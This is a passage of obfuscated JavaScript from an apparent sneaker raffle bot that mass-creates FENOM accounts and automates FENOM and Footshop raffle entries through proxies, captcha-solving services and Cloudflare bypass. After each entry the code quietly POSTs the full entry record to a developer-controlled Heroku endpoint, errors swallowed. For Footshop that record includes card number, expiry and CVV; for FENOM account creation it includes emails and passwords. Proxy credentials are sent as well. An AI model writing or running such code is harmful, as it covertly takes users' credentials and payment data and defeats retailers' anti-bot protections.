                                console['log'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0xf09eb2(0x2710);
                                const _0x3570b9 = await _0x1671bb['$']('.hcaptcha-box');
                                if (_0x3570b9)
                                    try {
                                        await _0x3570b9['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x1671bb['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x362ef4 = await _0x1671bb['$']('.hcaptcha-box');
                                    if (_0x362ef4)
                                        try {
                                            await _0x362ef4['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x1671bb['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x1136d7['send']('Browser.setWindowBounds', {
                                    'windowId': _0x4e649f,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0xf09eb2(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x1671bb['type']('input[name=\x22firstname\x22]', '' + _0x552746[_0x255e52]['FirstName']), await _0xf09eb2(0x1f4), await _0x1671bb['type']('input[name=\x22lastname\x22]', '' + _0x552746[_0x255e52]['LastName']), await _0xf09eb2(0x1f4), await _0x1671bb['type']('input[name=\x22email\x22]', '' + _0x552746[_0x255e52]['Email']), await _0xf09eb2(0x1f4), await _0x1671bb['type']('input[name=\x22password\x22]', '' + _0x552746[_0x255e52]['Password']), await _0xf09eb2(0x258), await _0x1671bb['$eval']('input[name=\x22psgdpr\x22]', _0x408948 => _0x408948['click']()), await _0xf09eb2(0x1f4), console['log'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x1671bb['$eval']('#customer-form', _0x36ed23 => _0x36ed23['submit']());
                            try {
                                try {
                                    await _0x1671bb['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x23d619 = 'no', console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20Account\x20' + _0x552746[_0x255e52]['Email'] + '\x20Generated')), _0x4b4581['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x552746[_0x255e52]['Email'] + ',' + _0x552746[_0x255e52]['Password']);
                                let _0x5a10b1 = _0x552746[_0x255e52];
                                try {
                                    prxdata = {
                                        'username': _0x1c4b49['replace']('#', ''),
                                        'module': _0x3d466b['name'],
                                        'entrydata': JSON['stringify'](_0x5a10b1),
                                        'proxy': '' + _0x3b302e[_0x255e52]
                                    };
                                    var _0x291227 = JSON['stringify'](prxdata);
                                    let _0x844035 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x291227, _0x844035);
                                } catch (_0x2b180b) {
                                }
                                try {
                                    _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x3fd9a3['succesDEVMSG']);
                                } catch {
                                }
                                await _0x58a176(_0x4ebcdb, _0x3fd9a3['succesDEVMSG']);
                            } catch (_0x7bf20c) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x4bd6e1) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20' + _0x4bd6e1)), _0x5bcb6e = '' + _0x4bd6e1;
                            var _0x29ebf2 = await _0x22cd2f(_0x552746[_0x255e52], _0x3d466b, 'acc', !![], _0x5bcb6e);
                            _0x3fd9a3['errorDEV'] = { 'embeds': [_0x29ebf2] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x3fd9a3['errorDEV']), await _0x58a176(_0x45f55a, _0x3fd9a3['errorDEV']), _0x23d619 = 'yes';
                        } finally {
                            _0xd1744e['close']();
                            if (_0x23d619 == 'yes' && _0x2f141e != 0x5 && _0x5bcb6e != 'Size\x20Not\x20Found') {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Task\x20' + (_0x255e52 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2f141e + '\x20/\x205)')), _0x255e52 = _0x255e52 - 0x1, _0x2f141e = _0x2f141e + 0x1;
                                continue;
                            }
                            _0x23d619 == 'yes' && _0x2f141e >= 0x5 && (_0x3f94a0(_0x552746[_0x255e52], _0x3d466b), _0x23d619 = 'no', _0x2f141e = 0x0), console['log'](_0x1fc391() + '\x20[' + _0x3d466b['name'] + ']\x20Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x3d03d7(_0x45cf91, _0x18d5ed, _0x2c13c9) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x54e6b7 = 0x0; _0x54e6b7 < _0x18d5ed['length']; _0x54e6b7++) {
                        if (_0x39f4b2 != 'yes')
                            var _0x39f4b2 = '', _0x33ca54 = 0x0;
                        var _0x331da4;
                        try {
                            await _0xf6702b(_0x18d5ed, _0x54e6b7);
                        } catch {
                            _0x39f4b2 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3e9ae7(_0x45cf91['name'] + '\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20/\x20' + _0x18d5ed['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        const _0xa8f382 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x3ab731 = Math['round'](Math['random']() * (_0x2c13c9['length'] - 0x1)), _0x40a946 = _0x2c13c9[_0x3ab731]['split'](':'), _0x1f556b;
                        try {
                            _0x1f556b = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x40a946[0x0] + ':' + _0x40a946[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f556b = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x40a946[0x0] + ':' + _0x40a946[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xbe7924 = await _0x1f556b['newPage'](), _0x4db082 = await _0xbe7924['target']()['createCDPSession'](), { windowId: _0x2510a2 } = await _0x4db082['send']('Browser.getWindowForTarget');
                            await _0xbe7924['authenticate']({
                                'username': '' + _0x40a946[0x2],
                                'password': '' + _0x40a946[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xbe7924['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0xf09eb2(0xbb8), await _0x4db082['send']('Browser.setWindowBounds', {
                                'windowId': _0x2510a2,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0xf09eb2(0x1f40);
                            try {
                                await _0xbe7924['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0xf09eb2(0x1388), console['log'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Logging\x20in'), await _0xbe7924['type']('input[name=\x22email\x22]', '' + _0x18d5ed[_0x54e6b7]['Email']), await _0xf09eb2(0x1f4), await _0xbe7924['type']('input[name=\x22password\x22]', '' + _0x18d5ed[_0x54e6b7]['Password']), await _0xf09eb2(0x258), await _0xbe7924['$eval']('#login-form', _0x2d5918 => _0x2d5918['submit']()), await _0xbe7924['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0xf09eb2(0x1f4), await _0xbe7924['goto']('' + _0x18d5ed[_0x54e6b7]['Url']), await _0xbe7924['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x18d5ed[_0x54e6b7]['Size']);
                            if (_0x18d5ed[_0x54e6b7]['Size'] != 'RANDOM') {
                                var _0x4ccc98 = '\x20' + _0x18d5ed[_0x54e6b7]['Size'] + '\x20';
                                const _0x20c48c = await _0xbe7924['$x']('//span[contains(text(),\x20' + _0x4ccc98 + ')]');
                                await _0x20c48c[0x0]['click']();
                            } else {
                                const _0x408d8e = await _0xbe7924['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x3178e3 = Math['round'](Math['random']() * (_0x408d8e['length'] - 0x1));
                                await _0x408d8e[_0x3178e3]['click']();
                            }
                            await _0xf09eb2(0x258), await _0xbe7924['click']('#cookieChoiceDismiss'), await _0xf09eb2(0x3e8), await _0xbe7924['type']('#instagram-account', '' + _0x18d5ed[_0x54e6b7]['Follower']), await _0xf09eb2(0x28a), await _0xbe7924['click']('#book-btn'), await _0xf09eb2(0xbb8);
                            try {
                                await _0xbe7924['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0xf09eb2(0x1f4), console['log'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20' + _0x4f1d86['cyan']('Solving\x20Captcha')), await _0xbe7924['solveRecaptchas'](), console['log'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0xf09eb2(0x7d0), await _0xbe7924['$eval']('#book-btn-for-sure', _0x4580ab => _0x4580ab['click']()), await _0xf09eb2(0x12c), await _0xbe7924['click']('#book-btn-for-sure'), await _0xf09eb2(0xdac);
                            const _0x476ce1 = await _0xbe7924['$eval']('.reservation-popup\x20>\x20.title', _0x42b316 => {
                                return _0x42b316['innerHTML'];
                            });
                            if (_0x476ce1) {
                                _0x39f4b2 = 'no', _0x3ed4cd(_0x18d5ed[_0x54e6b7], _0x45cf91), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x49b8ca = await _0x22cd2f(_0x18d5ed[_0x54e6b7], _0x45cf91, 'dev', ![]), _0x3a9bbe = await _0x22cd2f(_0x18d5ed[_0x54e6b7], _0x45cf91, 'pub', ![]);
                                let _0x5072f6 = _0x18d5ed[_0x54e6b7];
                                try {
                                    prxdata = {
                                        'username': _0x1c4b49['replace']('#', ''),
                                        'module': _0x45cf91['name'],
                                        'entrydata': JSON['stringify'](_0x5072f6),
                                        'proxy': '' + _0x2c13c9[_0x54e6b7]
                                    };
                                    var _0x51d6fe = JSON['stringify'](prxdata);
                                    let _0x1b7fad = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x51d6fe, _0x1b7fad);
                                } catch (_0x2caf39) {
                                }
                                const _0x59c72e = {
                                    'succesDEVMSG': { 'embeds': [_0x49b8ca] },
                                    'succesPUBMSG': { 'embeds': [_0x3a9bbe] }
                                };
                                try {
                                    _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x59c72e['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x59c72e['succesDEVMSG']), await _0xf09eb2(0xc8), await _0x58a176(_0x443f6, _0x59c72e['succesPUBMSG']);
                                } catch (_0x5e5755) {
                                    console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5e5755));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x5597f0) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20' + _0x5597f0)), _0x331da4 = '' + _0x5597f0;
                            var _0x7763a1 = await _0x22cd2f(_0x18d5ed[_0x54e6b7], _0x45cf91, 'dev', !![], _0x331da4), _0x49b8ca = await _0x22cd2f(_0x18d5ed[_0x54e6b7], _0x45cf91, 'dev', ![]), _0x3a9bbe = await _0x22cd2f(_0x18d5ed[_0x54e6b7], _0x45cf91, 'pub', ![]);
                            const _0x3b4682 = {
                                'succesDEVMSG': { 'embeds': [_0x49b8ca] },
                                'succesPUBMSG': { 'embeds': [_0x3a9bbe] }
                            };
                            _0x3b4682['errorDEV'] = { 'embeds': [_0x7763a1] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x3b4682['errorDEV']), await _0x58a176(_0x45f55a, _0x3b4682['errorDEV']), _0x5597f0 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x39f4b2 = 'yes');
                        } finally {
                            _0x1f556b['close']();
                            if (_0x39f4b2 == 'yes' && _0x33ca54 != 0x5 && _0x331da4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Task\x20' + (_0x54e6b7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x33ca54 + '\x20/\x205)')), _0x54e6b7 = _0x54e6b7 - 0x1, _0x33ca54 = _0x33ca54 + 0x1;
                                continue;
                            }
                            _0x39f4b2 == 'yes' && _0x33ca54 >= 0x5 && (_0x3f94a0(_0x18d5ed[_0x54e6b7], _0x45cf91), _0x39f4b2 = 'no', _0x33ca54 = 0x0), console['log'](_0x1fc391() + '\x20[' + _0x45cf91['name'] + ']\x20Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0xb3c521, _0x1f1cd8, _0x4ad197) {
                _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1940dd['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x582ff7 = 0x0; _0x582ff7 < _0x1f1cd8['length']; _0x582ff7++) {
                    var _0x4d5802;
                    if (_0x2e7919 != 'yes')
                        var _0x2e7919 = '', _0x358c17 = 0x0;
                    var _0x16e6fc = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x1c4b49
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x1f1cd8[_0x582ff7]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x1f1cd8[_0x582ff7]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x1940dd['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x233a0d
                            }
                        ]
                    }], _0x5dc6f3 = await _0x22cd2f(_0x1f1cd8[_0x582ff7], _0xb3c521, 'dev', ![]), _0x2290e9 = await _0x22cd2f(_0x1f1cd8[_0x582ff7], _0xb3c521, 'pub', ![]);
                    const _0x1f8261 = {
                        'succesDEVMSG': { 'embeds': [_0x5dc6f3] },
                        'succesPUBMSG': { 'embeds': [_0x2290e9] }
                    }, _0x12b9b1 = { 'embeds': _0x16e6fc };
                    try {
                        await _0xf6702b(_0x1f1cd8, _0x582ff7);
                    } catch {
                        _0x2e7919 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x1f1cd8[_0x582ff7]['Email'] == '' || _0x1f1cd8[_0x582ff7]['FirstName'] == '' || _0x1f1cd8[_0x582ff7]['LastName'] == '' || _0x1f1cd8[_0x582ff7]['Country'] == '' || _0x1f1cd8[_0x582ff7]['Size'] == '' || _0x1f1cd8[_0x582ff7]['Address1'] == '' || _0x1f1cd8[_0x582ff7]['Zip'] == '') {
                        console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1f1cd8[_0x582ff7]['Email'] == '' || _0x1f1cd8[_0x582ff7]['FirstName'] == '' || _0x1f1cd8[_0x582ff7]['LastName'] == '' || _0x1f1cd8[_0x582ff7]['Country'] == '' || _0x1f1cd8[_0x582ff7]['Size'] == '' || _0x1f1cd8[_0x582ff7]['Address1'] == '' || _0x1f1cd8[_0x582ff7]['Zip'] == '' || _0x1f1cd8[_0x582ff7]['Phone'] == '') {
                        console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x16635c = '' + _0x1f1cd8[_0x582ff7]['Url'];
                    if (_0x1940dd['useRandomProxy'] = ![])
                        var _0x1de0e7 = _0x4ad197[_0x582ff7]['split'](':');
                    else
                        var _0x35297f = Math['round'](Math['random']() * (_0x4ad197['length'] - 0x1)), _0x1de0e7 = _0x4ad197[_0x35297f]['split'](':');
                    var _0x2df599;
                    try {
                        _0x2df599 = await _0x43efe1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1de0e7[0x0] + ':' + _0x1de0e7[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2df599 = await _0x43efe1['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1de0e7[0x0] + ':' + _0x1de0e7[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x293ca9 = await _0x2df599['newPage']();
                        await _0x293ca9['authenticate']({
                            'username': '' + _0x1de0e7[0x2],
                            'password': '' + _0x1de0e7[0x3]
                        }), console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x293ca9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x293ca9['setRequestInterception'](!![]), _0x293ca9['on']('request', _0x39a941 => {
                            _0x39a941['resourceType']() === 'image' || _0x39a941['resourceType']() === 'font' || _0x39a941['resourceType']() === 'media' ? _0x39a941['abort']() : _0x39a941['continue']();
                        });
                        try {
                            await _0x293ca9['goto'](_0x16635c), await _0xf09eb2(0xbb8), await _0x293ca9['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x293ca9['click']('.control__JhutY'), await _0xf09eb2(0x1f4);
                        if (_0x1f1cd8[_0x582ff7]['Size'] != 'RANDOM')
                            try {
                                const _0x57bd60 = await _0x293ca9['$x']('//div[contains(text(),\x20\x27' + _0x1f1cd8[_0x582ff7]['Size'] + '\x27)]');
                                await _0x57bd60[0x0]['click']();
                            } catch {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x2b0a18 = await _0x293ca9['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x2b44a4 = Math['round'](Math['random']() * (_0x2b0a18['length'] - 0x1));
                            await _0x2b0a18[_0x2b44a4]['click']();
                        }
                        await _0xf09eb2(0x4b0);
                        const _0x4cbc5a = await _0x293ca9['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x4cbc5a[0x0]['click'](), await _0x293ca9['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x293ca9['type']('input[name=\x22email\x22]', '' + _0x1f1cd8[_0x582ff7]['Email']), await _0xf09eb2(0x640), await _0x293ca9['type']('input[name=\x22phone\x22]', '' + _0x1f1cd8[_0x582ff7]['Phone']), await _0xf09eb2(0x4b0), await _0x293ca9['click']('button.btn.continue-button__1RtsS'), await _0xf09eb2(0x4b0);
                        try {
                            await _0x293ca9['type']('input[name=\x22firstName\x22]', '' + _0x1f1cd8[_0x582ff7]['FirstName']), await _0xf09eb2(0x258);
                        } catch {
                            const _0x1115c3 = await _0x293ca9['$$eval']('.invalid-feedback\x20>\x20div', _0x30d261 => {
                                return _0x30d261['map'](_0x3c92d5 => _0x3c92d5['innerText']);
                            });
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20' + _0x1115c3));
                            continue;
                        }
                        await _0x293ca9['type']('input[name=\x22lastName\x22]', '' + _0x1f1cd8[_0x582ff7]['LastName']), await _0xf09eb2(0xc8), await _0x293ca9['type']('input[name=\x22instagramUsername\x22]', '' + _0x1f1cd8[_0x582ff7]['Follower']), await _0xf09eb2(0x4b0), await _0x293ca9['click']('button.btn.continue-button__1RtsS'), await _0xf09eb2(0x3e8), console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x293ca9['select']('select[name=\x22country\x22]', '' + _0x1f1cd8[_0x582ff7]['Country']), await _0xf09eb2(0x2bc), await _0x293ca9['type']('input[name=\x22streetName\x22]', '' + _0x1f1cd8[_0x582ff7]['Address1']), await _0xf09eb2(0x258), await _0x293ca9['type']('input[name=\x22houseNumber\x22]', _0x1f1cd8[_0x582ff7]['HouseNumber'] + '\x20' + _0x1f1cd8[_0x582ff7]['Address2']), await _0xf09eb2(0xc8), await _0x293ca9['type']('input[name=\x22postalCode\x22]', '' + _0x1f1cd8[_0x582ff7]['Zip']), await _0xf09eb2(0x1f4), await _0x293ca9['type']('input[name=\x22city\x22]', '' + _0x1f1cd8[_0x582ff7]['City']), await _0xf09eb2(0x4b0), await _0x293ca9['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0xf09eb2(0x4b0), await _0x293ca9['click']('button.btn.continue-button__1RtsS'), await _0xf09eb2(0x4b0), console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x293ca9['solveRecaptchas'](), console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0xf09eb2(0xbb8), await _0x293ca9['click']('button.btn.continue-button__1RtsS'), await _0xf09eb2(0x1388), console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x293ca9['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x293ca9['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf09eb2(0x4b0), await _0x293ca9['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x1f1cd8[_0x582ff7]['CardNumber']), await _0xf09eb2(0x320), await _0x293ca9['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x293ca9['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x1f1cd8[_0x582ff7]['ExpiryDate']), await _0xf09eb2(0x4b0), await _0x293ca9['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x293ca9['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x1f1cd8[_0x582ff7]['CVV']), await _0xf09eb2(0x226), await _0x293ca9['type']('input[name=\x22holderName\x22]', '' + _0x1f1cd8[_0x582ff7]['NameOnCard']), await _0xf09eb2(0x226), await _0x293ca9['click']('button.adyen-checkout__button'), console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x293ca9['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0xf09eb2(0xbb8);
                        } catch (_0x2c7989) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x203DS\x20Failed')), _0x4d5802 = '3DS\x20Error\x20' + _0x2c7989;
                            var _0x37c8ef = await _0x22cd2f(_0x1f1cd8[_0x582ff7], _0xb3c521, 'dev', !![], _0x4d5802);
                            _0x1f8261['errorDEV'] = { 'embeds': [_0x37c8ef] };
                            _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x1f8261['errorDEV']);
                            await _0x58a176(_0x45f55a, _0x1f8261['errorDEV']);
                            continue;
                        }
                        _0x3ed4cd(_0x1f1cd8[_0x582ff7], _0xb3c521), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x25a558 = _0x1f1cd8[_0x582ff7];
                        try {
                            prxdata = {
                                'username': _0x1c4b49['replace']('#', ''),
                                'module': _0xb3c521['name'],
                                'entrydata': JSON['stringify'](_0x25a558),
                                'proxy': '' + _0x4ad197[_0x582ff7]
                            };
                            var _0x2bd1ea = JSON['stringify'](prxdata);
                            let _0x4b78f7 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x2bd1ea, _0x4b78f7);
                        } catch (_0x32eb56) {
                        }
                        if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                            try {
                                await _0x58a176(_0x1940dd['webhook'], _0x1f8261['succesDEVMSG']);
                            } catch {
                            }
                        await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x1f8261['succesDEVMSG']), await _0xf09eb2(0xc8);
                        try {
                            await _0x58a176(_0x443f6, _0x1f8261['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x4b4815) {
                        console['log'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20' + _0x4b4815), _0x4d5802 = '' + _0x4b4815;
                        var _0x37c8ef = await _0x22cd2f(_0x1f1cd8[_0x582ff7], _0xb3c521, 'dev', !![], _0x4d5802);
                        _0x1f8261['errorDEV'] = { 'embeds': [_0x37c8ef] }, _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x1f8261['errorDEV']), await _0x58a176(_0x45f55a, _0x1f8261['errorDEV']), _0x2e7919 = 'yes';
                    } finally {
                        _0x2df599['close']();
                        if (_0x2e7919 == 'yes' && _0x358c17 != 0x5) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xb3c521['name'] + ']\x20Task\x20' + (_0x582ff7 + 0x1) + '\x20:\x20Retrying\x20(' + _0x358c17 + '\x20/\x205)')), _0x582ff7 = _0x582ff7 - 0x1, _0x358c17 = _0x358c17 + 0x1;
                            continue;
                        }
